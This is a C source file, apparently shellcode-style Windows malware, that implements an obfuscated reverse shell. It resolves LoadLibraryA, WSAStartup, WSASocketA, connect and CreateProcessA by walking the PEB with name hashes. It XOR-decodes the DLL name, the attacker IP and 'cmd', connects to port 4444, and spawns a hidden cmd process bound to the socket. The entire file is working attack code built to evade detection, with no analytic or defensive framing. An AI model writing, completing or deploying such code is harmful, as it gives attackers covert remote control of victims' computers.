#include "structs.h"
#include <stdio.h>

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

#define KEY1 0xec
#define KEY2 0x3c
#define KEY3 0x41

#define SEED                157
#define LOADLIBRARYA_H      1420784546
#define CREATEPROCESSA_H    628741118
#define WSASTARTUP_H        2083302682
#define WSASOCKETA_H        3358964994
#define CONNECT_H           1611305140

#define LOSELOSE_HASH(s, hash) do {                   \
    (hash) = 0;                                       \
    const char *_p = (s);                             \
    int _c;                                           \
    while ((_c = (unsigned char)(*_p++))) {           \
        (hash) += _c;                                 \
        (hash) *= (_c + SEED);                        \
    }                                                 \
} while (0)

#ifndef ARRAYSIZE
#define ARRAYSIZE(a)            (sizeof(a)/sizeof((a)[0]))
#endif

#define XOR_ARR(buf, key)       xor_bytes((buf), ARRAYSIZE(buf), (key))
#define HTONS(x)                ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
#define MEMSET(buf, val, len)   for (int i = 0; i < (len); i++) ((char*)(buf))[i] = (val)

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

typedef HMODULE (WINAPI* LOADLIBRARYA)(LPCSTR);
typedef int (WINAPI* WSASTARTUP)(WORD, LPWSADATA);
typedef SOCKET (WINAPI* WSASOCKETA)(int, int, int, WSAPROTOCOL_INFOA*, DWORD, DWORD);
typedef int (WINAPI* CONNECT)(SOCKET, struct sockaddr*, int);
typedef BOOL (WINAPI* CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID , LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

static inline  __attribute__((always_inline)) unsigned char xor8(unsigned char x, unsigned char y) {
 	return (x | y) & ~(x & y);  // equivalent to x ^ y 
}

static inline  __attribute__((always_inline)) void xor_bytes(unsigned char *buf, size_t n, unsigned char key) {
    for (size_t i = 0; i < n; ++i)
		buf[i] = xor8(buf[i], key);
}

// Get function address via PEB Walk
static HMODULE GetProcAddressPEB(DWORD64 qwFuncHash) {    
	PIMAGE_EXPORT_DIRECTORY pImgExportDir;
	DWORD dwFunctionNumber, dwHash;    
	PDWORD pdwFuncNameBase;
	PCSTR pszFunctionName;
	WORD wOrdinalIndex;

	PPEB pPEB = (PPEB) __readgsqword( 0x60 ); // Access the PEB structure directly via GS:[0x60] on x64.
	PPEB_LDR_DATA Ldr = (PPEB_LDR_DATA) pPEB->Ldr; // The PEB contains a pointer to PEB_LDR_DATA, which has a linked list of loaded modules.    
	PLIST_ENTRY pNextModule = Ldr->InLoadOrderModuleList.Flink; // This is the first module (usually the main EXE), and from here we walk the list.    
	PLDR_DATA_TABLE_ENTRY DataTableEntry = (PLDR_DATA_TABLE_ENTRY) pNextModule;	 
	while (DataTableEntry->DllBase != NULL) {    
    	DWORD64 qwModuleBase = (DWORD64)DataTableEntry->DllBase;	// Loop over all modules. DllBase is the base address of the module in memory.    
    	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS) ( qwModuleBase + ((PIMAGE_DOS_HEADER) qwModuleBase)->e_lfanew); // Locate NT headers using the PE structure (DOS header --> NT header).    
    	DWORD dwExportDirRVA = pImgNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress; // This retrieves the Export Directory from the module.
    	DataTableEntry = (PLDR_DATA_TABLE_ENTRY) DataTableEntry->InLoadOrderLinks.Flink; // Get the next loaded module entry (ntdll.dll --> kernel32.dll)
    	if (dwExportDirRVA == 0) {
        	continue;
    	}    
    	pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) ((DWORD64) qwModuleBase + dwExportDirRVA); // Get a pointer to the actual export directory table.
    	dwFunctionNumber = pImgExportDir->NumberOfNames;
    	pdwFuncNameBase = (PDWORD) ((PCHAR) qwModuleBase + pImgExportDir->AddressOfNames);  // Extract names of all exported functions from the module.
    	for (DWORD i = 0; i < dwFunctionNumber; i++) {
        	pszFunctionName = (PCSTR) (*pdwFuncNameBase + (DWORD64) qwModuleBase);
        	pdwFuncNameBase++;    
        	LOSELOSE_HASH(pszFunctionName, dwHash);    
        	if (dwHash == qwFuncHash) {	// For each function, hash its name and compare it to the input hash.                       	 
            	wOrdinalIndex = *(PWORD)(((DWORD64) qwModuleBase + pImgExportDir->AddressOfNameOrdinals) + (2 * i));
            	return (HMODULE) ((DWORD64) qwModuleBase + *(PDWORD)(((DWORD64) qwModuleBase + pImgExportDir->AddressOfFunctions) + (4 * wOrdinalIndex))); // If matched, resolve function address using its ordinal --> RVA --> VA.                               	 
        	}
    	}
	}
	return NULL;
}

void Main() {
    
	int port = 4444 ;

	//char ip[] = {0xb5,0xbd,0xb6,0xaa,0xb5,0xb2,0xbc,0xaa,0xb6,0xaa,0xbc, 0x84};
	unsigned char ip[] = {0x43, 0x3c, 0x3c, 0x3d, 0x3c};
	
	//   ws2_32.dll    0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key
	char ws2_32_dll[] = {0x9b, 0x9f, 0xde, 0xb3, 0xdf, 0xde, 0xc2, 0x88, 0x80, 0x80, 0xec};

	//	 cmd	  0x63, 0xcd, 0x64, key
	char cmd[] = {0x22, 0x2c, 0x25, 0x41};
	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key

	// get function addresses
	UINT64 pLoadLibraryA = (UINT64)GetProcAddressPEB(LOADLIBRARYA_H);
	UINT64 pCreateProcessA = (UINT64)GetProcAddressPEB(CREATEPROCESSA_H); 	   
	XOR_ARR(ws2_32_dll, KEY1);
	((LOADLIBRARYA)pLoadLibraryA)(ws2_32_dll);
	UINT64 pWSAStartup = (UINT64)GetProcAddressPEB(WSASTARTUP_H);
	UINT64 pWSASocketA = (UINT64)GetProcAddressPEB(WSASOCKETA_H);
	UINT64 pConnect = (UINT64)GetProcAddressPEB(CONNECT_H);

	// winsock struct declarations
	WSADATA wsadata; 
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	SOCKADDR_IN sa;
	
	// initiate  winsock
	((WSASTARTUP)pWSAStartup)(MAKEWORD(2, 2), &wsadata); 

	// create the socket
	SOCKET socket = ((WSASOCKETA)pWSASocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
	sa.sin_family = AF_INET;
	sa.sin_port = HTONS(port);
	XOR_ARR(ip, KEY2);
	sa.sin_addr.S_un.S_un_b.s_b1 = ip[0]; 
	sa.sin_addr.S_un.S_un_b.s_b2 = ip[1]; 
	sa.sin_addr.S_un.S_un_b.s_b3 = ip[2]; 
	sa.sin_addr.S_un.S_un_b.s_b4 = ip[3]; 

	// perform the connection
	((CONNECT)pConnect)(socket, (struct sockaddr*)&sa, sizeof(sa)); 

	// fill in StartupInfo
	size_t siLen = sizeof(si);
	MEMSET(&si, 0 ,siLen); 
	si.cb = siLen;
	si.dwFlags = (STARTF_USESTDHANDLES);
	si.hStdInput = (HANDLE)socket;
	si.hStdOutput = (HANDLE)socket;
	si.hStdError = (HANDLE)socket;
	
	// launch shell bound for socket
	XOR_ARR(cmd, KEY3);
	((CREATEPROCESSA)pCreateProcessA)(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi); 
}
